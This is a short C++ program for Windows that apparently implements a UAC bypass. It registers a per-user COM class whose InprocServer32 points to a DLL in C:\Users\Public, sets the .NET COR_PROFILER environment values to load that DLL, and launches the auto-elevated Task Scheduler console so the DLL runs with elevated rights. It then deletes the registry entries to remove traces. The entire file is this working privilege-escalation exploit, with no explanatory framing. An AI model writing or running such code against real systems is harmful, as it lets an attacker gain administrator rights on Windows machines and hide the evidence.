#include <windows.h>
#include <iostream>

void AddKey(HKEY hKeyRoot, LPCSTR subKey, LPCSTR valueName, DWORD dwType, const BYTE* data, DWORD cbData) {
    HKEY hKey;
    LONG result = RegCreateKeyExA(hKeyRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExA(hKey, valueName, 0, dwType, data, cbData);
        if (result == ERROR_SUCCESS) {
            std::cout << "Registry key set successfully.\n";
        }
        else {
            std::cerr << "Failed to set registry value. Error: " << result << "\n";
        }
        RegCloseKey(hKey);
    }
    else {
        std::cerr << "Failed to create/open registry key. Error: " << result << "\n";
    }
}

void DeleteParent(HKEY hKeyRoot, LPCSTR subKey) {
    LONG result = RegDeleteKeyA(hKeyRoot, subKey);
    if (result == ERROR_SUCCESS) {
        std::cout << "Registry key deleted successfully.\n";
    }
    else {
        std::cerr << "Failed to delete registry key. Error: " << result << "\n";
    }
}
void DeleteRKey(HKEY hKeyRoot, LPCSTR subKey, LPCSTR valueName) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(hKeyRoot, subKey, 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegDeleteValueA(hKey, valueName);
        if (result == ERROR_SUCCESS) {
            std::cout << "Registry value deleted successfully.\n";
        }
        else {
            std::cerr << "Failed to delete registry value. Error: " << result << "\n";
        }
        RegCloseKey(hKey);
    }
    else {
        std::cerr << "Failed to open registry key. Error: " << result << "\n";
    }
}


void DeleteUserEV(LPCSTR name) {
    if (SetEnvironmentVariableA(name, NULL)) {
        std::cout << "Environment variable " << name << " deleted.\n";
    }
    else {
        std::cerr << "Failed to delete environment variable " << name << ". Error: " << GetLastError() << "\n";
    }
}

void RunTS() {
    std::cout << "Opening Task Scheduler...\n";
    system("taskschd.msc");
}

int main() {
    const char* clsidKey = "Software\\Classes\\CLSID\\{A2D4B6C7-1234-5678-9ABC-DEF012345678}\\InprocServer32";
    const char* envKey = "Environment";

    // Add CLSID key
    const char* dllPath = "C:\\Users\\Public\\led.dll";
    AddKey(HKEY_CURRENT_USER, clsidKey, NULL, REG_EXPAND_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1);

    // Add Environment keys
    const char* profilerGUID = "{A2D4B6C7-1234-5678-9ABC-DEF012345678}";
    const char* enableProfiling = "1";

    AddKey(HKEY_CURRENT_USER, envKey, "COR_PROFILER", REG_SZ, (const BYTE*)profilerGUID, strlen(profilerGUID) + 1);
    AddKey(HKEY_CURRENT_USER, envKey, "COR_ENABLE_PROFILING", REG_SZ, (const BYTE*)enableProfiling, strlen(enableProfiling) + 1);
    AddKey(HKEY_CURRENT_USER, envKey, "COR_PROFILER_PATH", REG_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1);

    // Open Task Scheduler
    RunTS();

    // Cleanup registry keys
    DeleteParent(HKEY_CURRENT_USER, clsidKey); // Delete CLSID key
    DeleteParent(HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\{A2D4B6C7-1234-5678-9ABC-DEF012345678}"); // Parent key
    DeleteRKey(HKEY_CURRENT_USER, envKey, "COR_PROFILER");
    DeleteRKey(HKEY_CURRENT_USER, envKey, "COR_ENABLE_PROFILING");
    DeleteRKey(HKEY_CURRENT_USER, envKey, "COR_PROFILER_PATH");

    return 0;
}
